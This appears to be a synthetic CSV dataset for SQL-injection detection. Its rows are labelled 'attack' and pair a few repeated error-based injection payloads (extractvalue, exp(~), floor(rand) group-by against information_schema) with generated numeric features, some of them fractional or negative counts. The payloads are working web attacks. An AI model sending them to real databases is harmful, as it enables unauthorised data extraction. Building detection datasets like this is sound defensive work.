id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000131,5.406807769914712,265.7616882324219,75.75657653808594,40.26413345336914,100.52535247802734,-0.33370769023895264,89.4247055053711,38.15989685058594,0.7954322099685669,0.3034331202507019,0.1722719818353653,0.395856112241745,0.12208325415849686,3.8617160320281982,1.3904348611831665,0.9089649319648743,0.4728113114833832,0.12972451746463776,0.1580432802438736,0.050465263426303864,10.201279640197754,10.051806449890137,3.90678334236145,0.11584370583295822,1.7106236219406128,0.29758691787719727,0.010170514695346355,0.08344044536352158,0.20454388856887817,0.9139248728752136,0.2983320951461792,-0.2075415402650833,2.2892332077026367,-0.25504910945892334,0.2752786874771118,2.176632881164551,7.61315393447876,1.1651414632797241,3.137085437774658,0.6491419672966003,0.4117880165576935,0.7885017395019531,0.027802515774965286,0.0406000055372715,0.08917801082134247,-0.1283644139766693,0.2884827256202698,0.32004812359809875,0.39624908566474915,0.4806847870349884,0.23652057349681854,0.22375555336475372,0.16978180408477783,-0.1296030879020691,0.34255197644233704,0.10635311156511307,0.17038536071777344,0.12682627141475677,-0.2269570231437683,0.3487442433834076,0.020173534750938416,-0.04352199286222458,0.007523961365222931,0.09057647734880447,0.09441135823726654,0.016737334430217743,0.655586838722229,0.1417752355337143,-0.18490813672542572,-0.0434158593416214,0.06802009791135788,-0.10602159053087234,-0.016552254557609558,-0.26659247279167175,0.017840655520558357,-0.10641847550868988,1.1011015176773071,0.5100556015968323,0.08403940498828888,0.1671353429555893,0.4651281237602234,9.505602836608887,0.7952037453651428,0.24432465434074402,0.025701461359858513,0.8905590772628784,0.118499755859375,-0.0743836909532547,0.24655766785144806
GAN_000012,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.215535903571702,266.80462646484375,82.35965728759766,40.06073760986328,101.25709533691406,1.7124539613723755,81.63679504394531,38.35380935668945,1.22527015209198,0.2966894507408142,0.16673390567302704,0.3878302574157715,0.12164163589477539,3.795207977294922,1.5595840215682983,0.6524006724357605,0.49601975083351135,0.08395188301801682,-0.07439552247524261,-0.025209184736013412,10.087719917297363,9.835883140563965,4.2731218338012695,0.16053283214569092,1.7257975339889526,0.20168159902095795,-0.07218103855848312,0.12959446012973785,0.03160454332828522,0.814510703086853,0.22908222675323486,0.15135732293128967,2.1597213745117188,-0.04197216033935547,0.34140798449516296,2.05477237701416,7.633650302886963,0.8155321478843689,2.738785743713379,0.6961750984191895,0.4002097547054291,0.8712389469146729,-0.04999291151762009,0.004758941940963268,0.014196999371051788,-0.0390772819519043,0.04984164237976074,0.17928245663642883,0.31427431106567383,0.3680841624736786,0.02329089306294918,0.2895911633968353,0.04461705684661865,-0.1166987493634224,0.4465089440345764,0.05665278807282448,0.16242796182632446,0.04376322031021118,0.12822824716567993,0.36412498354911804,-0.042309243232011795,0.16760481894016266,0.1909254491329193,0.03242376446723938,0.080434650182724,0.21292126178741455,0.7679816484451294,-0.1460036337375641,-0.15297308564186096,-0.18006527423858643,-0.05842319130897522,-0.18574585020542145,-0.2147289216518402,-0.11967449635267258,0.011976046487689018,0.06611473113298416,1.1236722469329834,0.5611209273338318,-0.010380543768405914,0.04155325889587402,0.4953579902648926,9.580044746398926,0.8167679905891418,0.3202372193336487,0.012795016169548035,0.790577232837677,-0.12780062854290009,0.11941131949424744,0.06084458529949188
GAN_000013,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.3441105328192915,271.71356201171875,76.16358184814453,39.72541809082031,101.6769027709961,1.7760556936264038,92.35272216796875,37.99020767211914,0.8355008959770203,0.30218198895454407,0.16406068205833435,0.38748112320899963,0.12689755856990814,3.8626389503479004,1.328736424446106,0.5606276988983154,0.3086417615413666,0.03679764270782471,0.058075692504644394,0.07605870813131332,9.263745307922363,10.11162281036377,4.006210803985596,0.28200268745422363,1.7384856939315796,0.22242428362369537,-0.2463999092578888,-0.0015025322791188955,0.05919071286916733,0.8691360950469971,0.29877331852912903,0.018859684467315674,2.1202187538146973,-0.16200798749923706,0.317673921585083,1.9290066957473755,7.926811695098877,0.8508318662643433,2.7624223232269287,0.7489089965820312,0.31663450598716736,0.9208448529243469,-0.1422707438468933,0.020642464980483055,0.0024778172373771667,0.09095950424671173,0.1498628705739975,0.24605867266654968,0.3305607736110687,0.39277413487434387,0.19483861327171326,0.26066091656684875,0.0006767734885215759,-0.230869859457016,0.3705083727836609,0.051571521908044815,0.0872119590640068,0.11392484605312347,0.09367596358060837,0.28423646092414856,-0.13495300710201263,0.2680736482143402,0.07311712205410004,-0.029133029282093048,0.07374811172485352,0.03024328500032425,0.5991812348365784,0.2690580487251282,-0.04108945280313492,-0.1405901461839676,-0.10641852021217346,0.0028818370774388313,-0.05183066427707672,-0.06034497171640396,0.01325203850865364,-0.03931247070431709,1.0223888158798218,0.4210914373397827,0.23774486780166626,0.11067154258489609,0.48652246594429016,9.709537506103516,0.8905974626541138,0.2419908344745636,-0.010614453814923763,0.7868936657905579,0.0565207339823246,0.30543291568756104,0.13253964483737946
GAN_000014,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.065159563088802,268.6798095703125,80.78468322753906,40.755680084228516,102.22711944580078,0.8383651971817017,82.00010681152344,36.387603759765625,1.0342553853988647,0.30750399827957153,0.16448089480400085,0.3920780420303345,0.12651187181472778,3.827741861343384,1.497628927230835,0.7442928552627563,0.5101556181907654,0.07709204405546188,0.07069706171751022,0.05722798407077789,9.182781219482422,9.911859512329102,4.0229973793029785,0.1598895639181137,1.8139585256576538,0.19057276844978333,-0.08373290300369263,0.12440400570631027,0.09362197667360306,0.9163538217544556,0.23111215233802795,0.03608112037181854,1.9535245895385742,-0.10120852291584015,0.28685784339904785,2.0117099285125732,7.602045059204102,0.927680253982544,2.7288854122161865,0.7776545286178589,0.2404031604528427,0.8770460486412048,-0.036226093769073486,0.02342940680682659,-0.12233956903219223,0.04371131956577301,-0.04878588765859604,0.2935389578342438,0.26220306754112244,0.2921774387359619,0.17939120531082153,0.31572768092155457,-0.055927976965904236,-0.04159703105688095,0.39216017723083496,0.07590457797050476,0.14644357562065125,0.11753977835178375,-0.009374536573886871,0.1620667576789856,-0.05840107426047325,-0.011568885296583176,0.02637806534767151,0.03340417891740799,0.06974049657583237,-0.0030756592750549316,0.7101070284843445,0.058342769742012024,-0.09914710372686386,-0.003793679177761078,0.13494199514389038,-0.02087308093905449,-0.08396559208631516,0.024217121303081512,0.016177961602807045,0.07705147564411163,1.0814131498336792,0.5015007257461548,0.1359715312719345,0.09428559988737106,0.48989343643188477,9.643938064575195,0.7456617951393127,0.2411937713623047,0.01254385244101286,0.7806932330131531,-0.03256681188941002,0.0845770537853241,-0.13527145981788635
GAN_000015,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.1547665839012184,268.56549072265625,82.30206298828125,39.3874626159668,97.87884521484375,2.2427196502685547,82.22950744628906,38.448604583740234,0.9367430210113525,0.31370970606803894,0.16714037954807281,0.39094313979148865,0.1273980438709259,3.830573320388794,1.640855312347412,0.41907477378845215,0.37717723846435547,0.07218363136053085,0.006311784032732248,0.13330581784248352,9.715291976928711,9.534647941589355,4.070674896240234,0.15631985664367676,1.770807147026062,0.2060377299785614,-0.03415440768003464,0.1426597237586975,0.02518770843744278,0.8928292989730835,0.15102674067020416,-0.044486209750175476,2.035313129425049,-0.10345865786075592,0.2973285913467407,2.1208198070526123,7.546858787536621,1.0084352493286133,3.060288667678833,0.694966733455658,0.39884263277053833,0.905849039554596,0.07598314434289932,0.02050255611538887,-0.00872965157032013,0.11820105463266373,0.018598824739456177,0.3003663718700409,0.23607397079467773,0.33652910590171814,0.21505337953567505,0.33419153094291687,-0.04778538644313812,-0.0863303616642952,0.4699082374572754,0.045312605798244476,0.09216777980327606,-0.00569692999124527,0.015451274812221527,0.355085551738739,-0.06285616755485535,0.023121029138565063,-0.02869989722967148,0.19013342261314392,0.08604874461889267,0.09498263150453568,0.689177393913269,0.13372737169265747,-0.12971310317516327,-0.2103540003299713,0.11522708833217621,-0.09762769192457199,-0.026774056255817413,-0.07535355538129807,0.006237659137696028,-0.01420038565993309,1.0016306638717651,0.42817673087120056,0.028382405638694763,0.06610725820064545,0.48739537596702576,9.843679428100586,0.7873108983039856,0.25592944025993347,0.018786031752824783,0.822009801864624,-0.09590902924537659,0.02034100890159607,0.03203225135803223
GAN_000016,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.2250087129777985,267.34552001953125,78.24700927734375,39.17573547363281,97.57246398925781,4.598568916320801,87.93858337402344,37.19622039794922,0.8464936017990112,0.30059465765953064,0.1650782972574234,0.3883587121963501,0.12788976728916168,3.852046012878418,1.3923858404159546,0.5890551805496216,0.28897255659103394,0.04436170309782028,0.06670749932527542,-0.10205485671758652,9.444658279418945,9.974469184875488,3.712252616882324,0.18288540840148926,1.7935054302215576,0.2530151307582855,-0.11111793667078018,0.08673527091741562,0.06283456087112427,1.0619118213653564,0.21333098411560059,-0.13474445044994354,2.0771799087524414,-0.1740056276321411,0.25182026624679565,2.1188628673553467,7.8163323402404785,0.8244619369506836,2.7414348125457764,0.566362202167511,0.3944063186645508,0.9391518235206604,-0.012660257518291473,0.017093200236558914,0.07482235133647919,0.08217069506645203,0.03414049744606018,0.2777383625507355,0.3000624477863312,0.3811608850955963,0.21017003059387207,0.27399688959121704,0.01072491705417633,0.03698344528675079,0.5124621987342834,0.05790730565786362,0.061871714890003204,-0.08885779976844788,0.036262936890125275,0.3359133303165436,0.027251802384853363,0.05615568906068802,0.02546900510787964,0.05763944983482361,0.0684107318520546,0.10176815837621689,0.6193270087242126,0.18854926526546478,-0.08401673287153244,-0.11649645864963531,-0.07870686054229736,0.014652288518846035,0.0005116462707519531,-0.06818247586488724,0.011459214612841606,-0.05147837474942207,1.050113558769226,0.4141995906829834,0.022747717797756195,0.08016292005777359,0.5738468766212463,9.954931259155273,0.8509536385536194,0.24938586354255676,0.03279118612408638,0.7863056659698486,-0.010955361649394035,0.2186000943183899,0.18986524641513824
GAN_000017,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.097383402809981,272.11419677734375,82.41371154785156,41.61313247680664,101.70993041992188,2.4301834106445312,78.85595703125,35.823814392089844,1.0983014106750488,0.29757654666900635,0.16077879071235657,0.39494866132736206,0.12620870769023895,3.806490182876587,1.6359889507293701,0.8537207245826721,0.6298596262931824,0.08180627226829529,0.17641901969909668,-0.0507989376783371,9.049031257629395,9.982069969177246,4.0632004737854,0.13313281536102295,1.7728203535079956,0.20544542372226715,-0.023926973342895508,0.14598596096038818,0.17569813132286072,0.9441096782684326,0.2135257124900818,0.08322650194168091,2.0308544635772705,0.045358430594205856,0.2904299795627594,1.985230803489685,7.544772148132324,0.9429542422294617,2.6679093837738037,0.5641329884529114,0.28499945998191833,0.8656455874443054,-0.03852266073226929,0.019949251785874367,-0.25610673427581787,-0.0043203458189964294,-0.09410794824361801,0.307498574256897,0.27807608246803284,0.2666838467121124,0.19848158955574036,0.3540571630001068,-0.1015867292881012,0.018504410982131958,0.39087730646133423,0.10546506941318512,0.16704116761684418,0.2186126559972763,-0.041193194687366486,-0.010911703109741211,-0.12171003967523575,0.09880582988262177,0.00810028612613678,0.02291969209909439,0.06261888146400452,-0.08796785026788712,0.734813928604126,-0.04715220630168915,0.013975207693874836,0.02180413156747818,0.07387948036193848,-0.13942991197109222,-0.14311149716377258,0.06457611918449402,0.017946362495422363,0.12636932730674744,1.0958781242370605,0.4109792113304138,0.14060789346694946,0.05920686200261116,0.449429452419281,9.641193389892578,0.7202109098434448,0.2345210760831833,0.0050529902800917625,0.7878608107566833,0.041629526764154434,0.06218406930565834,-0.10538378357887268
GAN_000018,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.092258359999175,268.67578125,83.58024597167969,38.601463317871094,99.73147583007812,0.47895538806915283,80.93955993652344,37.065582275390625,0.8589439988136292,0.2906292676925659,0.16627608239650726,0.38795772194862366,0.12488793581724167,3.847550630569458,1.578984022140503,0.9598202705383301,0.4476536810398102,0.037930652499198914,0.17149664461612701,0.07594072818756104,8.909299850463867,10.122403144836426,4.081414222717285,0.03923780471086502,1.7808438539505005,0.18655526638031006,-0.15093788504600525,0.05555061623454094,0.13676777482032776,0.9518685340881348,0.2156122922897339,0.03799109160900116,2.100473642349243,0.0170440673828125,0.3352937698364258,1.8703137636184692,7.432301044464111,0.9709963202476501,2.6239490509033203,0.580179750919342,0.2376975417137146,0.8951540589332581,-0.20726504921913147,0.03355555608868599,-0.17108997702598572,-0.07500119507312775,0.153509721159935,0.2809276580810547,0.2724388837814331,0.34824731945991516,0.17656558752059937,0.3259572684764862,0.04361274093389511,-0.023785557597875595,0.38327309489250183,0.0812559649348259,0.13386030495166779,0.06149637699127197,0.1709374487400055,0.18489453196525574,-0.09237055480480194,0.05760412663221359,0.030969321727752686,0.047026582062244415,0.05150647461414337,-0.07301745563745499,0.6909491419792175,0.12875601649284363,0.045522961765527725,0.09920504689216614,-0.0006377622485160828,-0.11777736246585846,0.013509679585695267,0.10223066806793213,0.015857361257076263,-0.03884448483586311,1.2268528938293457,0.4743041694164276,-0.055440932512283325,0.01347269769757986,0.588599443435669,9.352553367614746,0.8372666835784912,0.2687564194202423,0.019118627533316612,0.7840489149093628,0.11535428464412689,0.11835084855556488,0.004108235239982605
GAN_000019,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.190660533901678,266.604248046875,82.98821258544922,38.47795867919922,101.9718246459961,0.15278828144073486,83.33712005615234,37.874935150146484,1.003913402557373,0.3070416748523712,0.16030260920524597,0.38858363032341003,0.1259988397359848,3.82332444190979,1.6510330438613892,0.8608434796333313,0.45786160230636597,0.027510030195116997,0.16629070043563843,0.009205924347043037,9.931751251220703,9.850044250488281,4.2578301429748535,0.1818138062953949,1.7390661239624023,0.1565350592136383,-0.07826720923185349,0.015563126653432846,-0.008153737522661686,0.9626657962799072,0.19978535175323486,0.10275138914585114,1.9851462841033936,-0.17264240980148315,0.35224735736846924,2.0308425426483154,7.492417812347412,0.7956177592277527,2.93770170211792,0.7412829995155334,0.36043035984039307,0.8989121317863464,-0.13583657145500183,0.01354154758155346,-0.0471273809671402,0.1253286600112915,-0.03280913084745407,0.24789829552173615,0.22837525606155396,0.3554559350013733,0.07684534043073654,0.3741218149662018,-0.0173482745885849,0.008087366819381714,0.4731457233428955,-0.0007306887418963015,0.09807118028402328,-0.13477826118469238,0.24167400598526,0.3884090483188629,0.03992391377687454,0.12472495436668396,0.006614871323108673,0.029639989137649536,0.07301005721092224,0.17641496658325195,0.6769073009490967,0.17278055846691132,-0.18413683772087097,-0.08544489741325378,-0.002728193998336792,-0.003435583785176277,-0.0909542515873909,-0.01072365790605545,0.021557962521910667,-0.017565827816724777,1.1051286458969116,0.477641224861145,0.054171524941921234,-0.007671200204640627,0.5130815505981445,9.54979419708252,0.847756564617157,0.25472673773765564,0.016145143657922745,0.8393539786338806,-0.0638459175825119,0.3309284746646881,0.051231905817985535
GAN_000020,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.380955371703309,270.1392822265625,76.7493667602539,40.81440734863281,94.22245025634766,0.842751145362854,89.26460266113281,39.970436096191406,1.2298082113265991,0.26992687582969666,0.16953900456428528,0.39090827107429504,0.1234772652387619,3.7688276767730713,1.5602405071258545,0.6371904015541077,0.4153633415699005,0.10988175123929977,-0.16442979872226715,-0.2114247977733612,8.84371566772461,9.813592910766602,3.131082057952881,0.2538178563117981,1.7557159662246704,0.16571220755577087,-0.320820689201355,0.16745199263095856,0.01410242822021246,0.6516818404197693,0.39061033725738525,0.34591084718704224,1.9545795917510986,0.1550000011920929,0.32796791195869446,1.997771143913269,7.032214164733887,0.5814334154129028,2.383450508117676,0.880401611328125,0.22664940357208252,0.8965213298797607,-0.21632423996925354,-0.0011409770231693983,-0.08322438597679138,0.1363847851753235,-0.02186485379934311,0.21329163014888763,0.1858389973640442,0.21052950620651245,0.03427385166287422,0.4152061343193054,-0.3349631130695343,-0.1096847653388977,0.42675942182540894,0.10001252591609955,0.07036150991916656,0.4918067455291748,0.053651563823223114,0.11092403531074524,-0.08901818096637726,0.3961082994937897,0.09734395891427994,0.23562729358673096,0.1231868788599968,0.13432219624519348,0.8248913288116455,-0.12269759178161621,-0.24775080382823944,-0.3829459846019745,0.13874338567256927,-0.22922591865062714,-0.24323061108589172,0.05879317224025726,2.1135350834811106e-05,0.42159169912338257,1.0547832250595093,0.40044695138931274,0.06882160156965256,0.048866719007492065,0.49010366201400757,9.21432113647461,0.8002251982688904,0.3172633945941925,-0.035809390246868134,0.793885350227356,-0.1612333059310913,0.12017583847045898,-0.26577675342559814
GAN_000021,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.166732523399829,267.1207275390625,80.47853088378906,41.05661392211914,101.04828643798828,4.6393351554870605,81.99002838134766,38.024688720703125,1.1891628503799438,0.2903773784637451,0.16552633047103882,0.39096981287002563,0.12419050186872482,3.7777328491210938,1.3743720054626465,0.709535539150238,0.5844283103942871,0.09233124554157257,-0.06553735584020615,-0.04175513982772827,9.144542694091797,9.938729286193848,4.0909576416015625,0.2883199453353882,1.7593145370483398,0.22333025932312012,-0.13248907029628754,0.20410805940628052,0.049839116632938385,0.8129887580871582,0.14194166660308838,0.2380547821521759,2.0734658241271973,-0.026732170954346657,0.3007943630218506,2.042863607406616,7.5201497077941895,0.7181246280670166,2.6100642681121826,0.6519256830215454,0.2883235812187195,0.943283200263977,-0.03131834417581558,0.00015507939679082483,0.01563739776611328,0.037379391491413116,-0.04017822444438934,0.23099955916404724,0.26156944036483765,0.26230865716934204,0.053940583020448685,0.3302864134311676,-0.0811728984117508,-0.017352227121591568,0.45751991868019104,0.0962376594543457,0.17164947092533112,0.24270711839199066,0.004154793918132782,0.06355884671211243,0.010201409459114075,0.07414506375789642,-0.02747134119272232,0.03177163749933243,0.09721630066633224,0.10500580817461014,0.7618789672851562,-0.14904993772506714,-0.06909807026386261,-0.0708184540271759,0.003213532269001007,-0.27409982681274414,-0.35509470105171204,-0.09109926968812943,0.011829513125121593,0.2512141764163971,1.171720266342163,0.4802689850330353,0.21015691757202148,0.05334014073014259,0.501288890838623,9.713712692260742,0.7561063766479492,0.2905330955982208,-0.01672603003680706,0.7573230266571045,-0.166995570063591,0.1196119487285614,-0.12123369425535202
GAN_000022,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.2345339914303555,265.7629699707031,80.27281951904297,40.49896240234375,99.406005859375,2.513671636581421,86.71218872070312,38.0511474609375,0.841783881187439,0.3001440763473511,0.15778373181819916,0.3888325095176697,0.125544011592865,3.8463993072509766,1.6895184516906738,0.7221255898475647,0.40538790822029114,0.010860531590878963,0.025392713025212288,0.02460777387022972,9.763694763183594,9.941473960876465,4.336780071258545,0.21655194461345673,1.752922534942627,0.19910535216331482,-0.15005706250667572,0.08357344567775726,0.013872846029698849,1.0143595933914185,0.1272718906402588,-6.976723670959473e-05,2.012876510620117,-0.17343196272850037,0.29898929595947266,2.122326374053955,7.547394275665283,0.7796967625617981,2.8518567085266113,0.5398989319801331,0.44046205282211304,0.9631465673446655,-0.00637991726398468,0.014035840518772602,0.05816963315010071,0.224898561835289,-0.02989216148853302,0.32727548480033875,0.27194344997406006,0.37947744131088257,0.17078155279159546,0.39898547530174255,-0.07233341038227081,-0.024735063314437866,0.5215842723846436,0.05527601018548012,0.09103932231664658,0.013795554637908936,0.11542987078428268,0.3729153871536255,0.11388712376356125,0.2777537703514099,-0.0979149118065834,0.14349380135536194,0.06087416037917137,0.12557518482208252,0.606531023979187,0.10016372799873352,-0.06421376764774323,-0.12509697675704956,-0.10630221664905548,-0.062460556626319885,-0.046343304216861725,-0.03498626500368118,0.009079048410058022,-0.001170046627521515,1.0589009523391724,0.3977460563182831,0.10322172194719315,0.005126617383211851,0.4876987040042877,9.811141014099121,0.8478472232818604,0.2903028428554535,0.0035812922287732363,0.7985990643501282,-0.1373872011899948,0.3098958432674408,0.23437677323818207
